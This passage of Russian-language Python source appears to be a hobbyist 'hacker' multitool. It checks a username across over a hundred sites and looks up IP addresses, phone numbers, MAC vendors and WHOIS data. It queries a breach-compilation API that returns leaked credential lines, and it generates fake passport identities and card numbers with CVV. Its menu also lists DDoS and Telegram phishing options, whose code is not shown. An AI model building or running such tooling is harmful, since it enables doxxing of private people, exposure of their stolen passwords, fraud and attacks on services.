    f"https://www.pinterest.com/{nick}",
    f"https://www.linkedin.com/in/{nick}",
    f"https://www.reddit.com/user/{nick}",
    f"https://discord.com/users/{nick}",
    f"https://www.flickr.com/photos/{nick}",
    f"https://vimeo.com/{nick}",
    f"https://{nick}.tumblr.com",
    f"https://www.quora.com/profile/{nick}",
    f"https://www.dailymotion.com/{nick}",
    f"https://foursquare.com/{nick}",
    f"https://myspace.com/{nick}",
    f"https://badoo.com/en/{nick}",
    f"https://www.yelp.com/user_details?userid={nick}",
    f"https://www.meetup.com/members/{nick}",
    f"https://www.weibo.com/{nick}",
    f"https://vk.com/{nick}",
    f"https://ok.ru/profile/{nick}",
    f"https://soundcloud.com/{nick}",
    f"https://spotify.com/user/{nick}",
    f"https://github.com/{nick}",
    f"https://bitbucket.org/{nick}",
    f"https://slack.com/{nick}",
    f"https://www.clubhouse.com/@{nick}",
    f"https://www.goodreads.com/user/show/{nick}",
    f"https://www.deviantart.com/{nick}",
    f"https://dribbble.com/{nick}",
    f"https://www.behance.net/{nick}",
    f"https://mix.com/{nick}",
    f"https://www.livejournal.com/users/{nick}",
    f"https://www.typepad.com/{nick}",
    f"https://www.blogger.com/profile/{nick}",
    f"https://www.wordpress.com/{nick}",
    f"https://www.wix.com/{nick}",
    f"https://www.shopify.com/{nick}",
    f"https://www.etsy.com/shop/{nick}",
    f"https://www.craigslist.org/about/sites#{nick}",
    f"https://www.alibaba.com/member/{nick}",
    f"https://www.amazon.com/s?k={nick}",
    f"https://www.ebay.com/sch/i.html?_nkw={nick}",
    f"https://www.target.com/s?searchTerm={nick}",
    f"https://www.walmart.com/search/?query={nick}",
    f"https://www.bestbuy.com/site/searchpage.jsp?st={nick}",
    f"https://www.kik.com/{nick}/",
    f"https://www.fanpop.com/fans/{nick}",
    f"https://www.ravelry.com/people/{nick}",
    f"https://www.codecademy.com/profiles/{nick}",
    f"https://www.mixedmartialarts.com/member/{nick}",
    f"https://www.patreon.com/{nick}",
    f"https://www.untappd.com/user/{nick}",
    f"https://www.fanfiction.net/u/{nick}",
    f"https://www.fortnite.gg/profile/{nick}",
    f"https://www.scribophile.com/profile/{nick}",
    f"https://www.aniroleplay.com/{nick}",
    f"https://www.kickstarter.com/profile/{nick}",
    f"https://www.gumtree.com/users/{nick}",
    f"https://www.notion.so/{nick}",
    f"https://www.reverbnation.com/{nick}",
    f"https://www.tubmlr.com/{nick}",
    f"https://www.triplejunearthed.com/{nick}",
    f"https://www.mayhem.com/user/{nick}",
    f"https://www.bungie.net/en/profile/{nick}",
    f"https://www.conanexiles.com/profile/{nick}",
    f"https://www.gamingonphone.com/{nick}",
    f"https://www.millennialmoms.com/user/{nick}",
    f"https://www.myentertainmentworld.ca/user/{nick}",
    f"https://www.artstation.com/{nick}",
    f"https://www.patreon.com/user/{nick}",
    f"https://ello.co/{nick}",
    f"https://www.steamcommunity.com/id/{nick}",
    f"https://www.gaiaonline.com/profiles/{nick}",
    f"https://www.thetoptens.com/users/{nick}/",
    f"https://www.picarto.tv/{nick}",
    f"https://www.younow.com/{nick}",
    f"https://www.kongregate.com/accounts/{nick}",
    f"https://www.quizlet.com/{nick}",
    f"https://www.couchsurfing.com/people/{nick}",
    f"https://www.dailykos.com/user/{nick}",
    f"https://www.openstreetmap.org/user/{nick}",
    f"https://www.minds.com/{nick}",
    f"https://www.alltrails.com/members/{nick}",
    f"https://letterboxd.com/{nick}",
    f"https://www.sporcle.com/user/{nick}",
    f"https://tapas.io/{nick}",
    f"https://www.wikihow.com/User:{nick}",
    f"https://www.taringa.net/{nick}",
    f"https://www.houzz.com/user/{nick}",
    f"https://about.me/{nick}",
    f"https://500px.com/{nick}",
    f"https://www.fiverr.com/{nick}",
    f"https://angel.co/{nick}",
    f"https://www.last.fm/user/{nick}",
    f"https://www.zhihu.com/people/{nick}",
    f"https://www.periscope.tv/{nick}",
    f"https://www.thetalentmanager.com/talent/{nick}",
    f"https://www.onfleet.com/{nick}",
    f"https://www.metacritic.com/user/{nick}",
    f"https://hubpages.com/@{nick}",
    f"https://www.newgrounds.com/{nick}",
    f"https://reedsy.com/{nick}",
    f"https://www.dndbeyond.com/profile/{nick}",
    f"https://www.wattpad.com/user/{nick}",
    f"https://www.igdb.com/people/{nick}",
    f"https://ko-fi.com/{nick}",
    f"https://www.bandcamp.com/{nick}",
    f"https://www.caffeine.tv/{nick}",
    f"https://www.hitrecord.org/users/{nick}",
    f"https://www.pof.com/{nick}",
    f"https://www.kiva.org/lender/{nick}",
    f"https://www.ancestry.com/{nick}",
    f"https://www.familysearch.org/tree/person/{nick}",
    f"https://www.storyfire.com/{nick}",
    f"https://www.beatstars.com/{nick}",
    f"https://www.smashcast.tv/{nick}",
    f"https://www.youpic.com/photographer/{nick}",
    f"https://www.gofundme.com/{nick}",
    f"https://www.backerkit.com/{nick}",
    f"https://www.bloglovin.com/@{nick}",
    f"https://www.npmjs.com/~{nick}",
    f"https://www.designcrowd.com/designer/{nick}",
    f"https://www.coursera.org/user/{nick}",
    f"https://muckrack.com/{nick}",
    f"https://www.stage32.com/{nick}",
    f"https://www.theknot.com/us/{nick}",
    f"https://www.ranker.com/profile-of/{nick}",
    f"https://www.behance.net/{nick}",
    f"https://www.carbonmade.com/{nick}",
    f"https://gumroad.com/{nick}",
    f"https://www.storenvy.com/{nick}",
    f"https://www.depop.com/{nick}",
    f"https://www.trakt.tv/users/{nick}",
    f"https://www.geocaching.com/profile/{nick}",
    f"https://www.medium.com/@{nick}",
    f"https://www.pexels.com/@{nick}",
    f"https://www.smugmug.com/{nick}",
    f"https://www.format.com/{nick}",
    f"https://www.bigcartel.com/store/{nick}",
    f"https://www.pixiv.net/en/users/{nick}",
    f"https://www.instapaper.com/{nick}",
    f"https://untappd.com/user/{nick}",
    f"https://www.slideshare.net/{nick}",
    f"https://www.desmos.com/@{nick}",
    f"https://www.ifttt.com/p/{nick}",
    f"https://www.academia.edu/{nick}",
    f"https://medium.com/@{nick}",
    f"https://www.gfycat.com/@{nick}",
    f"https://www.vine.co/{nick}",
    f"https://www.periscope.tv/{nick}",
    f"https://www.buzzfeed.com/{nick}",
]

    
    for url in urls:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(colored_text(f"{url} - аккаунт найден"))
            elif response.status_code == 404:  
                print(colored_text(f"{url} - аккаунт не найден"))
            else:
                print(colored_text(f"{url} - ошибка {response.status_code}"))
        except:
            print(colored_text(f"{url} - ошибка при проверке"))



    

def colored_text(text):
    """Возвращает текст в текущем цвете"""
    return f"{current_color}{text}{RESET}"

def generate_password(length=16):
    """Генерация очень сложного пароля с заданной длиной"""
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    print(colored_text(f"Сгенерированный пароль: {password}"))
    return password

def estimate_crack_time(password):
    """Оценка времени, необходимого для взлома пароля"""
    possible_characters = 0
    if any(c.islower() for c in password):
        possible_characters += len(string.ascii_lowercase)
    if any(c.isupper() for c in password):
        possible_characters += len(string.ascii_uppercase)
    if any(c.isdigit() for c in password):
        possible_characters += len(string.digits)
    if any(c in string.punctuation for c in password):
        possible_characters += len(string.punctuation)
    
    total_combinations = possible_characters ** len(password)
    attempts_per_second = 1_000_000_000
    crack_time_seconds = total_combinations / attempts_per_second

    crack_time_minutes = crack_time_seconds / 60
    crack_time_hours = crack_time_minutes / 60
    crack_time_days = crack_time_hours / 24
    crack_time_years = crack_time_days / 365

    if crack_time_seconds < 60:
        print(colored_text(f"Пароль может быть взломан за {crack_time_seconds:.2f} секунд."))
    elif crack_time_minutes < 60:
        print(colored_text(f"Пароль может быть взломан за {crack_time_minutes:.2f} минут."))
    elif crack_time_hours < 24:
        print(colored_text(f"Пароль может быть взломан за {crack_time_hours:.2f} часов."))
    elif crack_time_days < 365:
        print(colored_text(f"Пароль может быть взломан за {crack_time_days:.2f} дней."))
    else:
        print(colored_text(f"Пароль может быть взломан за {crack_time_years:.2f} лет."))


def get_website_info():
    domain = input("Введите доменное имя (например, example.com): ")
    
    try:
        domain_info = whois.whois(domain)
        
        print_string = f"""
   Информация о сайте: 
   Домен: {domain_info.domain_name or "Неизвестно"}
   Зарегистрирован: {domain_info.creation_date or "Неизвестно"}
   Истекает: {domain_info.expiration_date or "Неизвестно"}
   Владелец: {domain_info.get('registrant_name', 'Неизвестно')}
   Организация: {domain_info.get('registrant_organization', 'Неизвестно')}
   Адрес: {domain_info.get('registrant_address', 'Неизвестно')}
   Город: {domain_info.get('registrant_city', 'Неизвестно')}
   Штат: {domain_info.get('registrant_state', 'Неизвестно')}
   Почтовый индекс: {domain_info.get('registrant_postal_code', 'Неизвестно')}
   Страна: {domain_info.get('registrant_country', 'Неизвестно')}
   IP-адреса: {", ".join(domain_info.name_servers or ["Неизвестно"])}
        """
        
        print(print_string)
    except Exception as e:
        print(f"Ошибка: {e}")

def get_mac_info(mac: str) -> str:
    try:
        url = f"https://api.macvendors.com/{mac}"
        response = requests.get(url)
        if response.status_code == 200:
            vendor_info = response.text
            return f"Производитель MAC-адреса: {vendor_info}"
        else:
            return "Не удалось получить информацию о производителе MAC-адреса."
    except Exception as e:
        logging.error(f"Ошибка при получении информации о MAC-адресе {mac}: {e}")
        return f"Ошибка при получении информации о MAC-адресе: {e}"

def get_leak_info(query: str) -> str:
    try:
        url = f"https://api.proxynova.com/comb?query={query}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            count = data.get("count", 0)
            lines = data.get("lines", [])
            result = f"Количество утечек: {count}\n"
            result += "\n".join(lines)
            return result
        else:
            return "Не удалось получить информацию по утечкам."
    except Exception as e:
        logging.error(f"Ошибка при получении информации по утечкам для {query}: {e}")
        return f"Ошибка при получении информации по утечкам: {e}"

def get_phone_info(phone_number: str) -> str:
    try:
        # Парсинг номера телефона
        parsed_number = phonenumbers.parse(phone_number)
        
        # Проверка на валидность
        if not phonenumbers.is_valid_number(parsed_number):
            return "Номер телефона недействителен."
        
        # Получение информации
        country = geocoder.description_for_number(parsed_number, "ru")
        operator = carrier.name_for_number(parsed_number, "ru")
        timezones = timezone.time_zones_for_number(parsed_number)
        number_type = "мобильный" if phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE else "стационарный"
        
        return (colored_text(f"Страна: {country}\n"
                f"Оператор: {operator}\n"
                f"Тип номера: {number_type}\n"
                f"Часовые пояса: {', '.join(timezones)}"))
    except NumberParseException:
        return "Неверный формат номера телефона. Пожалуйста, используйте международный формат."
    except Exception as e:
        return f"Произошла ошибка: {e}"

def get_ip_info():
    ip_address = input(colored_text("Введите IP-адрес: "))
    try:
        response = requests.get(f'http://ipinfo.io/{ip_address}/json')
        if response.status_code == 200:
            data = response.json()
            print(colored_text(f"IP: {data.get('ip', 'Неизвестно')}"))
            print(colored_text(f"Город: {data.get('city', 'Неизвестно')}"))
            print(colored_text(f"Регион: {data.get('region', 'Неизвестно')}"))
            print(colored_text(f"Страна: {data.get('country', 'Неизвестно')}"))
            print(colored_text(f"Организация: {data.get('org', 'Неизвестно')}"))
        else:
            print(colored_text(f"Ошибка: не удалось получить данные (код ошибки {response.status_code})"))
    except requests.exceptions.RequestException as e:
        print(colored_text(f"Ошибка при подключении: {e}"))

def generate_fake_person():
    """Генерация фейковой личности в формате паспорта без указания города"""
    male_first_names = [
        "Александр", "Максим", "Дмитрий", "Иван", "Николай", "Сергей", "Артем", "Илья", "Денис", "Владимир",
        "Кирилл", "Никита", "Егор", "Андрей", "Роман", "Олег", "Павел", "Михаил", "Виктор", "Юрий",
        "Георгий", "Константин", "Анатолий", "Антон", "Арсений", "Василий", "Григорий", "Валентин",
        "Виталий", "Борис", "Леонид", "Станислав", "Алексей", "Федор", "Вадим", "Матвей", "Глеб", "Руслан",
        "Тимур", "Эдуард", "Семен", "Альберт", "Ярослав", "Петр", "Рустам", "Радислав"
    ]
    female_first_names = [
        "Анастасия", "Екатерина", "Мария", "Ольга", "Татьяна", "Елена", "Ксения", "Дарья", "Виктория", "Светлана",
        "Ирина", "Юлия", "Наталья", "Анна", "Алиса", "Вероника", "Людмила", "Полина", "Марина",
        "Нина", "Галина", "Зоя", "Валентина", "Олеся", "Алёна", "Любовь", "Яна", "София", "Евгения",
        "Надежда", "Вера", "Карина", "Милана", "Алисия", "Лидия", "Римма", "Эльвира", "Василиса", "Стефания",
        "Лариса", "Диана", "Анжелика", "Кристина", "Регина", "Арина", "Наталия", "Серафима", "Милена"
    ]
    male_last_names = [
        "Смирнов", "Иванов", "Кузнецов", "Петров", "Соколов", "Михайлов", "Федоров", "Попов", "Ковалев", "Новиков",
        "Морозов", "Волков", "Алексеев", "Лебедев", "Семенов", "Егоров", "Павлов", "Козлов", "Степанов", "Николаев",
        "Орлов", "Андреев", "Макаров", "Никитин", "Захаров", "Зайцев", "Соловьев", "Борисов", "Яковлев", "Григорьев",
        "Романов", "Васильев", "Максимов", "Герасимов", "Марков", "Новиков", "Фролов", "Беляев", "Гусев", "Киселев",
        "Ильин", "Гаврилов", "Титов", "Крылов", "Медведев", "Калинин", "Анисимов", "Чернов", "Гордеев", "Еремин"
    ]
    female_last_names = [
        "Смирнова", "Иванова", "Кузнецова", "Петрова", "Соколова", "Михайлова", "Федорова", "Попова", "Ковалёва", "Новикова",
        "Морозова", "Волкова", "Алексеева", "Лебедева", "Семенова", "Егорова", "Павлова", "Козлова", "Степанова", "Николаева",
        "Орлова", "Андреева", "Макарова", "Никитина", "Захарова", "Зайцева", "Соловьёва", "Борисова", "Яковлева", "Григорьева",
        "Романова", "Васильева", "Максимова", "Герасимова", "Маркова", "Фролова", "Беляева", "Гусева", "Киселёва", "Ильина",
        "Гаврилова", "Титова", "Крылова", "Медведева", "Калинина", "Анисимова", "Чернова", "Гордеева", "Ерёмина", "Леонова"
    ]

    # Определяем пол
    gender = random.choice(["male", "female"])

    # Генерируем имя и фамилию на основе пола
    if gender == "male":
        first_name = random.choice(male_first_names)
        last_name = random.choice(male_last_names)
    else:
        first_name = random.choice(female_first_names)
        last_name = random.choice(female_last_names)

    # Генерируем возраст, страну и номер паспорта
    age = random.randint(16, 30)
    country = random.choice(["Россия", "Украина"])
    passport_number = f"{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"

    # Вывод информации
    print(f"ФИО: {first_name} {last_name}, Возраст: {age} лет, Страна: {country}, Номер паспорта: {passport_number}")
def generate_fake_card():
    """Генерация фейковых данных карты"""
    card_number = f"{random.randint(4000, 4999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
    expiry_date = f"{random.randint(1, 12):02}/{random.randint(23, 30)}"
    cvv = random.randint(100, 999)
    print(colored_text(f"Номер карты: {card_number}, Дата истечения: {expiry_date}, CVV: {cvv}"))



def clear_screen():
    """Очистка экрана"""
    os.system('cls' if os.name == 'nt' else 'clear')



def wait_for_input():
    """Ожидание нажатия клавиши"""
    input(colored_text("Нажмите Enter, чтобы продолжить..."))



def set_color(color_code):
    """Установка текущего цвета текста."""
    global current_color
    current_color = color_code



def color_menu():
    """Меню для изменения цвета текста."""
    while True:
        clear_screen()
        print(colored_text("""
Выберите цвет текста:
1. Красный
2. Зеленый
3. Темно-синий
4. Белый
5. Ввести свой цвет (шестнадцатеричный код)
6. Вернуться в главное меню
        """))

        choice = input(colored_text("Введите номер действия: "))

        if choice in COLORS:
            set_color(COLORS[choice])
            print(colored_text("Цвет установлен."))
        elif choice == '5':
            hex_color = input(colored_text("Введите цвет в формате #RRGGBB (например, #F0F0F0): "))
            if len(hex_color) == 7 and hex_color.startswith('#'):
                # Преобразуем шестнадцатеричный код в escape последовательности
                r = int(hex_color[1:3], 16)
                g = int(hex_color[3:5], 16)
                b = int(hex_color[5:7], 16)
                set_color(f'\033[38;2;{r};{g};{b}m')  # Установка 24-битного цвета
                print(colored_text("Цвет установлен на пользовательский."))
            else:
                print(colored_text("Неверный формат цвета. Пожалуйста, попробуйте снова."))
        elif choice == '6':
            break
        else:
            print(colored_text("Неверный ввод, попробуйте снова."))






def menu():
    while True:
        clear_screen()
        print(colored_text("""

		██████╗  ██╗██╗  ██╗
		██╔══██╗███║╚██╗██╔╝
		██║  ██║╚██║ ╚███╔╝ 
		██║  ██║ ██║ ██╔██╗ 
		██████╔╝ ██║██╔╝ ██╗
		╚═════╝  ╚═╝╚═╝  ╚═╝by:Krytoi1czel
		Выберите действие:

[1] Генерация сложного пароля                                
[2] Оценить время взлома пароля	                    
[3] Пробить по IP                               
[4] Генератор     
[5] Поиск по соц. сетям
[6] DDoS
[7] Пробив по номеру
[8] Поиск по MAC адрессу                                     
[9] Поиск по утечкам
[10] Пробив сайта
[11] Б@HB0PD
[12] Фишинг телеграмм
[13] Мануалы
[98] Сменить тему
[99] Выйти


 """)) 
 

        choice = input(colored_text("Введите номер действия: "))





        if choice == '1':
            length = int(input(colored_text("Введите длину пароля (по умолчанию 16): ") or "16"))
            generate_password(length)
        elif choice == '2':
            password = input(colored_text("Введите пароль для оценки времени взлома: "))
            estimate_crack_time(password)
        elif choice == '3':
            get_ip_info()
        elif choice == '4':
            menu_generator()
        elif choice == '5':
            search_social_media()
        elif choice == '6':
            ddos_attack() 
        elif choice == '7':
            phone_number = input(colored_text("Введите номер телефона в международном формате (например, +79876543210): "))
            info = get_phone_info(phone_number)
            print(info)
        elif choice == '8':
            mac = input(colored_text("Введите MAC-адрес (например, 00:1A:2B:3C:4D:5E): "))
            info = get_mac_info(mac)
            print(info)
        elif choice == '9':
            query = input(colored_text("Введите email, ник или пароль для поиска утечек: "))
            info = get_leak_info(query)
            print(info)
        elif choice == "10":
            get_website_info()
        elif choice == '11':
            banword()
        elif choice == "12":
            start_bot()
        elif choice == '13':
            manuals_menu()
        elif choice == '98':
            color_menu()
        elif choice == '99':
            print(colored_text("Выход из программы..."))
            break
        else:
            print(colored_text("Неверный ввод, попробуйте снова."))

        wait_for_input()
time.sleep(0.5)
popi()



 
if __name__ == "__main__":
    menu()
